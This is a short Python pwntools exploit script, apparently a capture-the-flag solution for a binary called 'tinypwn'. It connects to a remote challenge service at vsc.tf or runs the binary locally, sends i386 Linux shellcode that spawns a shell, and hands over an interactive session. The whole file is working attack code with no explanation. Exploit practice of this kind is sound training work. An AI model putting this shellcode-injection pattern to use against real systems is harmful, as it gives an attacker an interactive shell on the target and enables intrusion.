#!/usr/bin/python3

from pwn import *

exe = ELF('tinypwn', checksec=False)

# context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''


                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('vsc.tf', 3026)
else:
        p = process(exe.path)

GDB()
sl(asm(shellcraft.i386.linux.sh()))
p.interactive()
